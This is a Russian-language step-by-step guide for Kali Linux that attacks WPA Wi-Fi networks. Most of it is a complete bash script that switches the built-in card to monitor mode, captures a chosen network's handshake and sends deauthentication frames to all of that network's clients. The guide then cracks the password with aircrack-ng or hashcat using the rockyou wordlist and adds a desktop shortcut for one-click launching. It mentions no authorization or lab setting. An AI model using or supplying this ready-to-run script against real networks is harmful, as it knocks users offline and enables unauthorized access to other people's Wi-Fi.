# Захват WPA handshake и брутфорс на ноутбуке с Kali (встроенная Wi‑Fi карта)

Инструкция для Kali Linux на ноутбуке со встроенным Wi‑Fi (без внешней карты).

---

## 1. Подготовка системы

```bash
sudo apt update
sudo apt install -y aircrack-ng hcxtools hashcat p7zip-full
```

Распакуй словарь, если он в `.gz`:

```bash
7z x /usr/share/wordlists/rockyou.txt.gz -o/usr/share/wordlists/
```

---

## 2. Скрипт для захвата handshake

Создаём файл:

```bash
nano ~/wifi-save-deauth-clean2.sh
```

Вставь содержимое:

```bash
#!/bin/bash

echo "============================"
echo " Захват WPA handshake + deauth (встроенная карта)"
echo "============================"
echo ""

if [ -z "$SUDO_USER" ]; then
    REAL_HOME="$HOME"
else
    REAL_HOME="/home/$SUDO_USER"
fi

WLAN="wlan0"

if ! iwconfig "$WLAN" 2>/dev/null | grep -q "IEEE 802.11"; then
    echo "ERROR: интерфейс $WLAN не найден или не Wi‑Fi."
    exit 1
fi

echo "Интерфейс: $WLAN"
echo ""

echo "Останавливаем NetworkManager и wpa_supplicant..."
sudo systemctl stop NetworkManager 2>/dev/null || true
sudo systemctl stop wpa_supplicant 2>/dev/null || true

echo "Переводим $WLAN в режим монитора вручную..."
sudo ip link set "$WLAN" down
sudo iw dev "$WLAN" set type monitor
sudo ip link set "$WLAN" up

MON="$WLAN"

echo "Монитор‑интерфейс: $MON"
echo ""

echo "Нажми Ctrl+C, когда увидишь нужную сеть (смотрим ~30 секунд)."
echo ""

sudo timeout 30 airodump-ng "$MON" || true

echo ""
echo "Список сетей ты видел выше."
read -p "BSSID целевой сети: " BSSID
read -p "Имя сети (ESSID, например dlink2): " ESSID
read -p "Канал: " CHANNEL

BASE_DIR="$REAL_HOME/handshakes"
CLEAN_ESSID=$(echo "$ESSID" | tr ' /\\:*?"<>|' '_________')
NET_DIR="$BASE_DIR/$CLEAN_ESSID"

mkdir -p "$NET_DIR"

BASE_FILE="$NET_DIR/handshake_${BSSID//:/-}_$(date +%H%M)"

echo ""
echo "Запускаем захват handshake + deauth:"
echo "BSSID   : $BSSID"
echo "Канал   : $CHANNEL"
echo "Сеть    : $ESSID (папка: $NET_DIR)"
echo ""

echo "Нажми Ctrl+C, когда увидишь WPA handshake: $BSSID"
echo ""

sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$BASE_FILE" "$MON" &
CAPTURE_PID=$!

sleep 2
echo "Запускаем deauth для всех клиентов на BSSID $BSSID (60 секунд)..."
sudo aireplay-ng --deauth 60 -a "$BSSID" "$MON" &
DEAUTH_PID=$!

trap 'echo ""; echo "Пользователь нажал Ctrl+C, завершаем..."; sudo kill "$CAPTURE_PID" 2>/dev/null; sudo kill "$DEAUTH_PID" 2>/dev/null; wait "$CAPTURE_PID" 2>/dev/null; wait "$DEAUTH_PID" 2>/dev/null' INT

wait "$CAPTURE_PID" 2>/dev/null || true
sudo kill "$DEAUTH_PID" 2>/dev/null
wait "$DEAUTH_PID" 2>/dev/null

ps aux | grep -q "airodump-ng.*$BSSID.*-w" && sudo killall airodump-ng

echo "Захват завершён."
echo ""

HAS_HANDSHAKE=false

CAP_FILES=("$NET_DIR"/*"${BSSID//:/-}"_*.cap*)

for f in "${CAP_FILES[@]}"; do
    if [ -f "$f" ]; then
        if aircrack-ng "$f" 2>&1 | grep -q "1 handshake"; then
            echo "✅ Handshake найден в: $f"
            HAS_HANDSHAKE=true
        else
            echo "❌ Handshake НЕ найден в: $f → удаляем файлы."
            rm -f "$f"*
        fi
    fi
done

if [ "$HAS_HANDSHAKE" = false ]; then
    echo "⚠️ Handshake не найден НИ в одном файле — папка $NET_DIR пуста или все файлы удалены."
else
    echo "Handshake сохранён успешно."
fi

echo "Возвращаем интерфейс в managed‑режим..."
sudo ip link set "$MON" down
sudo iw dev "$MON" set type managed
sudo ip link set "$MON" up

echo "Запускаем NetworkManager и wpa_supplicant..."
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant

echo "Интерфейс $WLAN снова в обычном режиме."
echo "Выход."
```

Сохрани (Ctrl+O → Enter → Ctrl+X) и сделай исполняемым:

```bash
chmod +x ~/wifi-save-deauth-clean2.sh
```

---

## 3. Захват handshake

Запуск:

```bash
sudo ~/wifi-save-deauth-clean2.sh
```

Дальше:

1. Введи sudo‑пароль.  
2. Скрипт остановит `NetworkManager` / `wpa_supplicant`, включит монитор‑режим.  
3. Покажет список сетей (~30 секунд).  
4. Ты введёшь:
   - `BSSID` (например `B8:A3:86:19:54:50`)  
   - `ESSID` (например `dlink2`)  
   - `Канал` (например `10`)  
5. Скрипт запустит захват + deauth, потом проверит handshake.  
6. Если handshake есть, он сохранится, например, в:

   ```text
   /home/gtsopm/handshakes/dlink2/handshake_B8-A3-86-19-54-50_*.cap
   ```

---

## 4. Брутфорс на том же ноутбуке

Пусть у тебя файл:

```text
/home/gtsopm/handshakes/dlink2/handshake_B8-A3-86-19-54-50_1545-01.cap
```

### 4.1. Через `aircrack-ng` (проще)

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  /home/gtsopm/handshakes/dlink2/handshake_B8-A3-86-19-54-50_1545-01.cap
```

### 4.2. Через `hashcat` (быстрее, если есть GPU)

1. Конвертация в `hc22000`:

   ```bash
   hcxpcapngtool -o /tmp/dlink2.hc22000 \
     /home/gtsopm/handshakes/dlink2/handshake_B8-A3-86-19-54-50_1545-01.cap
   ```

2. Брутфорс:

   ```bash
   hashcat -m 22000 -a 0 /tmp/dlink2.hc22000 /usr/share/wordlists/rockyou.txt
   ```

Если пароль будет найден, `hashcat` покажет его и сохранит в `~/.hashcat/hashcat.potfile`.

---

## 5. (Опционально) Ярлык на рабочем столе для захвата

```bash
nano ~/Рабочий\ стол/wifi-handshake.desktop
```

```ini
[Desktop Entry]
Type=Application
Name=Захват WPA handshake
Comment=Захват handshake + deauth на встроенной карте
Exec=qterminal -e "bash -c 'sudo ~/wifi-save-deauth-clean2.sh; echo \"Нажми Enter для выхода...\"; read'"
Icon=system-run
Terminal=true
Categories=Network;
```

Сделай исполняемым:

```bash
chmod +x ~/Рабочий\ стол/wifi-handshake.desktop
```

Теперь можно запускать захват двойным кликом по иконке.
